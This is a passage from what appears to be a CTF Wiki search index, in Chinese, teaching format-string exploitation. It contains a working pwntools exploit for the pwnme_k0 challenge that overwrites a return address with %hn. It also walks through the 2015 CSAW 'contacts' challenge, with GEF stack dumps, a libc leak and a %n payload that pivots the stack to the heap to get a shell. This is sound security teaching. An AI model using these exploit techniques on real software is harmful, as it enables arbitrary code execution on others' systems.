 0x00007fffffffdc30  \u2192  0x0000000000400eb0  \u2192   push r15     \u2190 $rsp, $rbp\n0x00007fffffffdb48\u2502+0x08: 0x0000000000400d74  \u2192   add rsp, 0x30\n0x00007fffffffdb50\u2502+0x10:  aaaaaaaa      \u2190 $rdi\n0x00007fffffffdb58\u2502+0x18: 0x000000000000000a\n0x00007fffffffdb60\u2502+0x20: 0x7025702500000000\n0x00007fffffffdb68\u2502+0x28:  %p%p%p%p%p%p%p%pM\\r@ \n0x00007fffffffdb70\u2502+0x30:  %p%p%p%pM\\r@ \n0x00007fffffffdb78\u2502+0x38: 0x0000000000400d4d  \u2192   cmp eax, 0x2  \u53ef\u4ee5\u53d1\u73b0\u6211\u4eec\u8f93\u5165\u7684\u7528\u6237\u540d\u5728\u6808\u4e0a\u7b2c\u4e09\u4e2a\u4f4d\u7f6e\uff0c\u90a3\u4e48\u9664\u53bb\u672c\u8eab\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u4f4d\u7f6e\uff0c\u5176\u504f\u79fb\u4e3a\u4e3a5+3=8\u3002", 
            "title": "\u786e\u5b9a\u504f\u79fb"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_20", 
            "text": "\u6211\u4eec\u518d\u4ed4\u7ec6\u89c2\u5bdf\u4e0b\u65ad\u70b9\u5904\u6808\u7684\u4fe1\u606f  0x00007fffffffdb40\u2502+0x00: 0x00007fffffffdb80  \u2192  0x00007fffffffdc30  \u2192  0x0000000000400eb0  \u2192   push r15     \u2190 $rsp, $rbp\n0x00007fffffffdb48\u2502+0x08: 0x0000000000400d74  \u2192   add rsp, 0x30\n0x00007fffffffdb50\u2502+0x10:  aaaaaaaa      \u2190 $rdi\n0x00007fffffffdb58\u2502+0x18: 0x000000000000000a\n0x00007fffffffdb60\u2502+0x20: 0x7025702500000000\n0x00007fffffffdb68\u2502+0x28:  %p%p%p%p%p%p%p%pM\\r@ \n0x00007fffffffdb70\u2502+0x30:  %p%p%p%pM\\r@ \n0x00007fffffffdb78\u2502+0x38: 0x0000000000400d4d  \u2192   cmp eax, 0x2  \u53ef\u4ee5\u770b\u5230\u6808\u4e0a\u7b2c\u4e8c\u4e2a\u4f4d\u7f6e\u5b58\u50a8\u7684\u5c31\u662f\u8be5\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740(\u5176\u5b9e\u4e5f\u5c31\u662f\u8c03\u7528showaccounth\u51fd\u6570\u65f6\u6267\u884cpush rip\u6240\u5b58\u50a8\u7684\u503c)\uff0c\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u7684\u504f\u79fb\u4e3a7\u3002  \u4e0e\u6b64\u540c\u65f6\u6808\u4e0a\uff0c\u7b2c\u4e00\u4e2a\u5143\u7d20\u5b58\u50a8\u7684\u4e5f\u5c31\u662f\u4e0a\u4e00\u4e2a\u51fd\u6570\u7684rbp\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u504f\u79fb0x00007fffffffdb80-0x00007fffffffdb48=0x38\u3002\u7ee7\u800c\u5982\u679c\u6211\u4eec\u77e5\u9053\u4e86rbp\u7684\u6570\u503c\uff0c\u5c31\u77e5\u9053\u4e86\u51fd\u6570\u8fd4\u56de\u5730\u5740\u7684\u5730\u5740\u3002  0x0000000000400d74\u4e0e0x00000000004008A6\u53ea\u6709\u4f4e2\u5b57\u8282\u4e0d\u540c\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u53ea\u4fee\u65390x00007fffffffdb48\u5f00\u59cb\u76842\u4e2a\u5b57\u8282\u3002", 
            "title": "\u4fee\u6539\u5730\u5740"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_21", 
            "text": "\u8fd9\u91cc\u4f7f\u7528data[1:]\u7684\u539f\u56e0\u662f\u5f53\u6211\u4eecsplit\u7684\u65f6\u5019\u7531\u4e8e\u8d77\u59cb\u7684\u662f0x\uff0c\u6240\u4ee5\u4f1a\u4ea7\u751f\u2018\u2019\u5b57\u7b26\u4e32\uff0c\u9700\u8981\u8df3\u8fc7\u3002  from   pwn   import   *  from   LibcSearcher   import   *  pwnme   =   ELF ( ./pwnme_k0 )  if   args [ REMOTE ]: \n     sh   =   remote ( 11 ,   11 )  else : \n     sh   =   process ( ./pwnme_k0 )  sh . recvuntil ( : \\n )  sh . sendline ( a   *   8 )  sh . recvuntil ( : \\n )  sh . sendline ( %p   *   9 )  sh . recvuntil ( )  sh . sendline ( 1 )  sh . recvuntil ( a   *   8   +   \\n )  data   =   sh . recvuntil ( 1. ,   drop = True ) . split ( 0x )  print   data  data   =   data [ 1 :]  rbp   =   int ( data [ 5 ],   16 )  ret_addr   =   rbp   -   0x38  sh . recvuntil ( )  sh . sendline ( 2 )  sh . recvuntil ( : \\n )  sh . sendline ( p64 ( ret_addr ))  sh . recvuntil ( : \\n )  payload   =   %2214d %8$hn  sh . sendline ( payload )  sh . recvuntil ( )  sh . sendline ( 1 )  sh . interactive ()", 
            "title": "\u5229\u7528\u7a0b\u5e8f"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_22", 
            "text": "", 
            "title": "\u5806\u4e0a\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_23", 
            "text": "\u6240\u8c13\u5806\u4e0a\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6307\u7684\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u672c\u8eab\u5b58\u50a8\u5728\u5806\u4e0a\uff0c\u8fd9\u4e2a\u4e3b\u8981\u589e\u52a0\u4e86\u6211\u4eec\u83b7\u53d6\u5bf9\u5e94\u504f\u79fb\u7684\u96be\u5ea6\uff0c\u800c\u4e00\u822c\u6765\u8bf4\uff0c\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u90fd\u662f\u5f88\u6709\u53ef\u80fd\u88ab\u590d\u5236\u5230\u6808\u4e0a\u7684\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_24", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u4ee52015\u5e74CSAW\u4e2d\u7684contacts\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_25", 
            "text": "\u279c   2015 -CSAW-contacts git: ( master )  \u2717 checksec contacts\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x8048000 )   \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e0d\u4ec5\u5f00\u542f\u4e86NX\u4fdd\u62a4\u8fd8\u5f00\u542f\u4e86Canary\u3002", 
            "title": "\u786e\u5b9a\u4fdd\u62a4"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_26", 
            "text": "\u7b80\u5355\u770b\u770b\u7a0b\u5e8f\uff0c\u53d1\u73b0\u7a0b\u5e8f\u6b63\u5982\u540d\u5b57\u6240\u63cf\u8ff0\u7684\uff0c\u662f\u4e00\u4e2a\u8054\u7cfb\u4eba\u76f8\u5173\u7684\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u5b9e\u73b0\u521b\u5efa\uff0c\u4fee\u6539\uff0c\u5220\u9664\uff0c\u6253\u5370\u8054\u7cfb\u4eba\u7684\u4fe1\u606f\u3002\u800c\u518d\u4ed4\u7ec6\u9605\u8bfb\uff0c\u53ef\u4ee5\u53d1\u73b0\u5728\u8f93\u5165\u8054\u7cfb\u4eba\u4fe1\u606f\u7684\u65f6\u5019\u5b58\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002  int   __cdecl   PrintInfo ( int   a1 ,   int   a2 ,   int   a3 ,   char   * format )  { \n   printf ( \\t Name: %s \\n ,   a1 ); \n   printf ( \\t Length %u \\n ,   a2 ); \n   printf ( \\t Phone #: %s \\n ,   a3 ); \n   printf ( \\t Description:  ); \n   return   printf ( format );  }   \u4ed4\u7ec6\u770b\u770b\uff0c\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2aformat\u5176\u5b9e\u662f\u6307\u5411\u5806\u4e2d\u7684\u3002", 
            "title": "\u5206\u6790\u7a0b\u5e8f"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_27", 
            "text": "\u6211\u4eec\u7684\u57fa\u672c\u76ee\u7684\u662f\u83b7\u53d6\u7cfb\u7edf\u7684shell\uff0c\u4ece\u800c\u62ff\u5230flag\u3002\u5176\u5b9e\u65e2\u7136\u6709\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u6211\u4eec\u5e94\u8be5\u662f\u53ef\u4ee5\u901a\u8fc7\u52ab\u6301got\u8868\u6216\u8005\u63a7\u5236\u7a0b\u5e8f\u8fd4\u56de\u5730\u5740\u6765\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\u3002\u4f46\u662f\u8fd9\u91cc\u5374\u4e0d\u600e\u4e48\u53ef\u884c\u3002\u539f\u56e0\u5206\u522b\u5982\u4e0b   \u4e4b\u6240\u4ee5\u4e0d\u80fd\u591f\u52ab\u6301got\u6765\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\uff0c\u662f\u56e0\u4e3a\u6211\u4eec\u53d1\u73b0\u5bf9\u4e8e\u7a0b\u5e8f\u4e2d\u5e38\u89c1\u7684\u53ef\u4ee5\u5bf9\u4e8e\u6211\u4eec\u7ed9\u5b9a\u7684\u5b57\u7b26\u4e32\u8f93\u51fa\u7684\u53ea\u6709printf\u51fd\u6570\uff0c\u6211\u4eec\u53ea\u6709\u9009\u62e9\u5b83\u624d\u53ef\u4ee5\u6784\u9020/bin/sh\u8ba9\u5b83\u6267\u884csystem('/bin/sh')\uff0c\u4f46\u662fprintf\u51fd\u6570\u5728\u5176\u4ed6\u5730\u65b9\u4e5f\u5747\u6709\u7528\u5230\uff0c\u8fd9\u6837\u505a\u4f1a\u4f7f\u5f97\u7a0b\u5e8f\u76f4\u63a5\u5d29\u6e83\u3002  \u5176\u6b21\uff0c\u4e0d\u80fd\u591f\u76f4\u63a5\u63a7\u5236\u7a0b\u5e8f\u8fd4\u56de\u5730\u5740\u6765\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\u7684\u662f\u56e0\u4e3a\u6211\u4eec\u5e76\u6ca1\u6709\u4e00\u5757\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\u7684\u5730\u5740\u6765\u5b58\u50a8\u6211\u4eec\u7684\u5185\u5bb9\uff0c\u540c\u65f6\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6765\u5f80\u6808\u4e0a\u76f4\u63a5\u5199\u5165system_addr+'bbbb'+addr of '/bin/sh\u2018\u4f3c\u4e4e\u5e76\u4e0d\u73b0\u5b9e\u3002   \u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u600e\u4e48\u505a\u5462\uff1f\u6211\u4eec\u8fd8\u6709\u4e4b\u524d\u5728\u6808\u6ea2\u51fa\u8bb2\u7684\u6280\u5de7\uff0cstack privot\u3002\u800c\u8fd9\u91cc\uff0c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u7684\u6070\u597d\u662f\u5806\u5185\u5b58\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u628a\u6808\u8fc1\u79fb\u5230\u5806\u4e0a\u53bb\u3002\u8fd9\u91cc\u6211\u4eec\u901a\u8fc7leave\u6307\u4ee4\u6765\u8fdb\u884c\u6808\u8fc1\u79fb\uff0c\u6240\u4ee5\u5728\u8fc1\u79fb\u4e4b\u524d\u6211\u4eec\u9700\u8981\u4fee\u6539\u7a0b\u5e8f\u4fdd\u5b58ebp\u7684\u503c\u4e3a\u6211\u4eec\u60f3\u8981\u7684\u503c\u3002 \u53ea\u6709\u8fd9\u6837\u5728\u6267\u884cleave\u6307\u4ee4\u7684\u65f6\u5019\uff0cesp\u624d\u4f1a\u6210\u4e3a\u6211\u4eec\u60f3\u8981\u7684\u503c\u3002\u540c\u65f6\uff0c\u56e0\u4e3a\u6211\u4eec\u662f\u4f7f\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6765\u8fdb\u884c\u4fee\u6539\uff0c\u6240\u4ee5\u6211\u4eec\u5f97\u77e5\u9053\u4fdd\u5b58ebp\u7684\u5730\u5740\u4e3a\u591a\u5c11\uff0c\u800c\u8fd9\u65f6PrintInfo\u51fd\u6570\u4e2d\u5b58\u50a8ebp\u7684\u5730\u5740\u6bcf\u6b21\u90fd\u5728\u53d8\u5316\uff0c\u800c\u6211\u4eec\u4e5f\u65e0\u6cd5\u901a\u8fc7\u5176\u4ed6\u65b9\u6cd5\u5f97\u77e5\u3002\u4f46\u662f\uff0c \u7a0b\u5e8f\u4e2d\u538b\u5165\u6808\u4e2d\u7684ebp\u503c\u5176\u5b9e\u4fdd\u5b58\u7684\u662f\u4e0a\u4e00\u4e2a\u51fd\u6570\u7684\u4fdd\u5b58ebp\u503c\u7684\u5730\u5740 \uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u5176 \u4e0a\u5c42\u51fd\u6570\u7684\u4fdd\u5b58\u7684ebp\u7684\u503c\uff0c\u5373\u4e0a\u4e0a\u5c42\u51fd\u6570\uff08\u5373main\u51fd\u6570\uff09\u7684ebp\u6570\u503c \u3002\u8fd9\u6837\u5f53\u4e0a\u5c42\u7a0b\u5e8f\u8fd4\u56de\u65f6\uff0c\u5373\u5b9e\u73b0\u4e86\u5c06\u6808\u8fc1\u79fb\u5230\u5806\u7684\u64cd\u4f5c\u3002  \u57fa\u672c\u601d\u8def\u5982\u4e0b   \u9996\u5148\u83b7\u53d6system\u51fd\u6570\u7684\u5730\u5740  \u901a\u8fc7\u6cc4\u9732\u67d0\u4e2alibc\u51fd\u6570\u7684\u5730\u5740\u6839\u636elibc database\u786e\u5b9a\u3002    \u6784\u9020\u57fa\u672c\u8054\u7cfb\u4eba\u63cf\u8ff0\u4e3asystem_addr+'bbbb'+binsh_addr  \u4fee\u6539\u4e0a\u5c42\u51fd\u6570\u4fdd\u5b58\u7684ebp(\u5373\u4e0a\u4e0a\u5c42\u51fd\u6570\u7684ebp)\u4e3a \u5b58\u50a8system_addr\u7684\u5730\u5740-4 \u3002  \u5f53\u4e3b\u7a0b\u5e8f\u8fd4\u56de\u65f6\uff0c\u4f1a\u6709\u5982\u4e0b\u64cd\u4f5c  move esp,ebp\uff0c\u5c06esp\u6307\u5411system_addr\u7684\u5730\u5740-4  pop ebp\uff0c \u5c06esp\u6307\u5411system_addr  ret\uff0c\u5c06eip\u6307\u5411system_addr\uff0c\u4ece\u800c\u83b7\u53d6shell\u3002", 
            "title": "\u5229\u7528\u601d\u8def"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_28", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u662f\u83b7\u53d6system\u51fd\u6570\u5730\u5740\u3001/bin/sh\u5730\u5740\uff0c\u6808\u4e0a\u5b58\u50a8\u8054\u7cfb\u4eba\u63cf\u8ff0\u7684\u5730\u5740\uff0c\u4ee5\u53caPrintInfo\u51fd\u6570\u7684\u5730\u5740\u3002  \u9996\u5148\uff0c\u6211\u4eec\u6839\u636e\u6808\u4e0a\u5b58\u50a8\u7684libc_start_main_ret\u5730\u5740(\u8be5\u5730\u5740\u662f\u5f53main\u51fd\u6570\u6267\u884c\u8fd4\u56de\u65f6\u4f1a\u8fd0\u884c\u7684\u51fd\u6570)\u6765\u83b7\u53d6system\u51fd\u6570\u5730\u5740\u3001/bin/sh\u5730\u5740\u3002\u6211\u4eec\u6784\u9020\u76f8\u5e94\u7684\u8054\u7cfb\u4eba\uff0c\u7136\u540e\u9009\u62e9\u8f93\u51fa\u8054\u7cfb\u4eba\u4fe1\u606f\uff0c\u5e76\u5c06\u65ad\u70b9\u4e0b\u5728printf\u5904\uff0c\u5e76\u4e14\u4e00\u76f4\u8fd0\u884c\u5230\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684printf\u51fd\u6570\u5904\uff0c\u5982\u4e0b   \u2192 0xf7e44670  printf+0        call   0xf7f1ab09  __x86.get_pc_thunk.ax \n   \u21b3  0xf7f1ab09  __x86.get_pc_thunk.ax+0  mov    eax, DWORD PTR  [ esp ] \n      0xf7f1ab0c  __x86.get_pc_thunk.ax+3  ret    \n      0xf7f1ab0d  __x86.get_pc_thunk.dx+0  mov    edx, DWORD PTR  [ esp ] \n      0xf7f1ab10  __x86.get_pc_thunk.dx+3  ret    \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  stack  ] \u2500\u2500\u2500\u2500 [ 0xffffccfc ,  l8 ]  8 \n0xffffccfc\u2502+0x00: 0x08048c27  \u2192   leave      \u2190  $esp \n0xffffcd00\u2502+0x04: 0x0804c420  \u2192   1234567 \n0xffffcd04\u2502+0x08: 0x0804c410  \u2192   11111 \n0xffffcd08\u2502+0x0c: 0xf7e5acab  \u2192   puts+11  add ebx, 0x152355\n0xffffcd0c\u2502+0x10: 0x00000000\n0xffffcd10\u2502+0x14: 0xf7fad000  \u2192  0x001b1db0\n0xffffcd14\u2502+0x18: 0xf7fad000  \u2192  0x001b1db0\n0xffffcd18\u2502+0x1c: 0xffffcd48  \u2192  0xffffcd78  \u2192  0x00000000   \u2190  $ebp \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  trace  ] \u2500\u2500\u2500\u2500 [ #0] 0xf7e44670 \u2192 Name: __printf(format=0x804c420  1234567\\n )  [ #1] 0x8048c27 \u2192 leave   [ #2] 0x8048c99 \u2192 add DWORD PTR [ebp-0xc], 0x1  [ #3] 0x80487a2 \u2192 jmp 0x80487b3  [ #4] 0xf7e13637 \u2192 Name: __libc_start_main(main=0x80486bd, argc=0x1, argv=0xffffce14, init=0x8048df0, fini=0x8048e60, rtld_fini=0xf7fe88a0  _dl_fini , stack_end=0xffffce0c)  [ #5] 0x80485e1 \u2192 hlt  \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\ngef\u27a4  dereference  $esp   140  [ $esp ,  140 ]  1 \n0xffffccfc\u2502+0x00: 0x08048c27  \u2192   leave      \u2190  $esp \ngef\u27a4  dereference  $esp  l140 [ $esp ,  l140 ]  140 \n0xffffccfc\u2502+0x00: 0x08048c27  \u2192   leave      \u2190  $esp \n0xffffcd00\u2502+0x04: 0x0804c420  \u2192   1234567 \n0xffffcd04\u2502+0x08: 0x0804c410  \u2192   11111 \n0xffffcd08\u2502+0x0c: 0xf7e5acab  \u2192   puts+11  add ebx, 0x152355\n0xffffcd0c\u2502+0x10: 0x00000000\n0xffffcd10\u2502+0x14: 0xf7fad000  \u2192  0x001b1db0\n0xffffcd14\u2502+0x18: 0xf7fad000  \u2192  0x001b1db0\n0xffffcd18\u2502+0x1c: 0xffffcd48  \u2192  0xffffcd78  \u2192  0x00000000   \u2190  $ebp \n0xffffcd1c\u2502+0x20: 0x08048c99  \u2192   add DWORD PTR  [ ebp-0xc ] , 0x1\n0xffffcd20\u2502+0x24: 0x0804b0a8  \u2192   11111 \n0xffffcd24\u2502+0x28: 0x00002b67  ( g+ ? ) \n0xffffcd28\u2502+0x2c: 0x0804c410  \u2192   11111 \n0xffffcd2c\u2502+0x30: 0x0804c420  \u2192   1234567 \n0xffffcd30\u2502+0x34: 0xf7fadd60  \u2192  0xfbad2887\n0xffffcd34\u2502+0x38: 0x08048ed6  \u2192  0x25007325  ( %s ? ) \n0xffffcd38\u2502+0x3c: 0x0804b0a0  \u2192  0x0804c420  \u2192   1234567 \n0xffffcd3c\u2502+0x40: 0x00000000\n0xffffcd40\u2502+0x44: 0xf7fad000  \u2192  0x001b1db0\n0xffffcd44\u2502+0x48: 0x00000000\n0xffffcd48\u2502+0x4c: 0xffffcd78  \u2192  0x00000000\n0xffffcd4c\u2502+0x50: 0x080487a2  \u2192   jmp 0x80487b3\n0xffffcd50\u2502+0x54: 0x0804b0a0  \u2192  0x0804c420  \u2192   1234567 \n0xffffcd54\u2502+0x58: 0xffffcd68  \u2192  0x00000004\n0xffffcd58\u2502+0x5c: 0x00000050  ( P ? ) \n0xffffcd5c\u2502+0x60: 0x00000000\n0xffffcd60\u2502+0x64: 0xf7fad3dc  \u2192  0xf7fae1e0  \u2192  0x00000000\n0xffffcd64\u2502+0x68: 0x08048288  \u2192  0x00000082\n0xffffcd68\u2502+0x6c: 0x00000004\n0xffffcd6c\u2502+0x70: 0x0000000a\n0xffffcd70\u2502+0x74: 0xf7fad000  \u2192  0x001b1db0\n0xffffcd74\u2502+0x78: 0xf7fad000  \u2192  0x001b1db0\n0xffffcd78\u2502+0x7c: 0x00000000\n0xffffcd7c\u2502+0x80: 0xf7e13637  \u2192   __libc_start_main+247  add esp, 0x10\n0xffffcd80\u2502+0x84: 0x00000001\n0xffffcd84\u2502+0x88: 0xffffce14  \u2192  0xffffd00d  \u2192   /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/201[...] \n0xffffcd88\u2502+0x8c: 0xffffce1c  \u2192  0xffffd058  \u2192   XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]   \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u7b80\u5355\u7684\u5224\u65ad\u53ef\u4ee5\u5f97\u5230  0xffffcd7c\u2502+0x80: 0xf7e13637  \u2192   __libc_start_main+247  add esp, 0x10  \u5b58\u50a8\u7684\u5c31\u662fmain\u76f8\u5e94\u7684\u5730\u5740\uff0c\u540c\u65f6\u5229\u7528fmtarg\u6765\u83b7\u53d6\u5bf9\u5e94\u7684\u504f\u79fb\uff0c\u53ef\u4ee5\u770b\u51fa\u5176\u504f\u79fb\u4e3a32\uff0c\u90a3\u4e48\u76f8\u5bf9\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u4e3a31\u3002  gef\u27a4  fmtarg 0xffffcd7c\nThe index of format argument :  32   \u8fd9\u6837\u6211\u4eec\u4fbf\u53ef\u4ee5\u5f97\u5230\u5bf9\u5e94\u7684\u5730\u5740\u4e86\u3002\u8fdb\u800c\u53ef\u4ee5\u6839\u636elibc-database\u6765\u83b7\u53d6\u5bf9\u5e94\u7684libc\uff0c\u7ee7\u800c\u83b7\u53d6system\u51fd\u6570\u5730\u5740\u4e0e/bin/sh\u51fd\u6570\u5730\u5740\u4e86\u3002  \u5176\u6b21\uff0c\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u6808\u4e0a\u5b58\u50a8\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u5730\u57400xffffcd2c\u76f8\u5bf9\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u4e3a6\uff0c\u5f97\u5230\u8fd9\u4e2a\u662f\u4e3a\u4e86\u6784\u9020\u6211\u4eec\u7684\u8054\u7cfb\u4eba\u3002  \u518d\u8005\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u4e0b\u9762\u7684\u5730\u5740\u4fdd\u5b58\u7740\u4e0a\u5c42\u51fd\u6570\u7684\u8c03\u7528\u5730\u5740\uff0c\u5176\u76f8\u5bf9\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u4e3a11\uff0c\u8fd9\u6837\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539\u4e0a\u5c42\u51fd\u6570\u5b58\u50a8\u7684ebp\u7684\u503c\u3002  0xffffcd18\u2502+0x1c: 0xffffcd48  \u2192  0xffffcd78  \u2192  0x00000000   \u2190  $ebp", 
            "title": "\u83b7\u53d6\u76f8\u5173\u5730\u5740\u4e0e\u504f\u79fb"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_29", 
            "text": "\u5f97\u77e5\u4e0a\u9762\u7684\u4fe1\u606f\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u4e0b\u9762\u7684\u65b9\u5f0f\u83b7\u53d6\u5806\u5730\u5740\u4e0e\u76f8\u5e94\u7684ebp\u5730\u5740\u3002  [system_addr][bbbb][binsh_addr][%6$p][%11$p][bbbb]  \u6765\u83b7\u53d6\u5bf9\u5e94\u7684\u76f8\u5e94\u7684\u5730\u5740\u3002\u540e\u9762\u7684bbbb\u662f\u4e3a\u4e86\u63a5\u53d7\u5b57\u7b26\u4e32\u65b9\u4fbf\u3002  \u8fd9\u91cc\u56e0\u4e3a\u51fd\u6570\u8c03\u7528\u65f6\u6240\u7533\u8bf7\u7684\u6808\u7a7a\u95f4\u4e0e\u91ca\u653e\u7684\u7a7a\u95f4\u662f\u4e00\u81f4\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u5f97\u5230\u7684ebp\u5730\u5740\u5e76\u4e0d\u4f1a\u56e0\u4e3a\u6211\u4eec\u518d\u6b21\u8c03\u7528\u800c\u6539\u53d8\u3002", 
            "title": "\u6784\u9020\u8054\u7cfb\u4eba\u83b7\u53d6\u5806\u5730\u5740"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#ebp", 
            "text": "\u7531\u4e8e\u6211\u4eec\u9700\u8981\u6267\u884cmove\u6307\u4ee4\u5c06ebp\u8d4b\u7ed9esp\uff0c\u5e76\u8fd8\u9700\u8981\u6267\u884cpop ebp\u624d\u4f1a\u6267\u884cret\u6307\u4ee4\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u5c06ebp\u4fee\u6539\u4e3a\u5b58\u50a8system\u5730\u5740-4\u7684\u503c\u3002\u8fd9\u6837pop ebp\u4e4b\u540e\uff0cesp\u6070\u597d\u6307\u5411\u4fdd\u5b58system\u7684\u5730\u5740\uff0c\u8fd9\u65f6\u5728\u6267\u884cret\u6307\u4ee4\u5373\u53ef\u6267\u884csystem\u51fd\u6570\u3002  \u4e0a\u9762\u5df2\u7ecf\u5f97\u77e5\u4e86\u6211\u4eec\u5e0c\u671b\u4fee\u6539\u7684ebp\u503c\uff0c\u800c\u4e5f\u77e5\u9053\u4e86\u5bf9\u5e94\u7684\u504f\u79fb\u4e3a11\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u5982\u4e0b\u7684payload\u6765\u8fdb\u884c\u4fee\u6539\u76f8\u5e94\u7684\u503c\u3002  part1 = (heap_addr - 4) / 2\npart2 = heap_addr - 4 - part1\npayload =  %  + str(part1) +  x%  + str(part2) +  x%6$n", 
            "title": "\u4fee\u6539ebp"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#shell", 
            "text": "\u8fd9\u65f6\uff0c\u6267\u884c\u5b8c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u4e4b\u540e\uff0c\u9000\u51fa\u5230\u4e0a\u4e0a\u51fd\u6570\uff0c\u6211\u4eec\u8f93\u51655\uff0c\u9000\u51fa\u7a0b\u5e8f\u5373\u4f1a\u6267\u884cret\u6307\u4ee4\uff0c\u5c31\u53ef\u4ee5\u83b7\u53d6shell\u3002", 
            "title": "\u83b7\u53d6shell"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_30", 
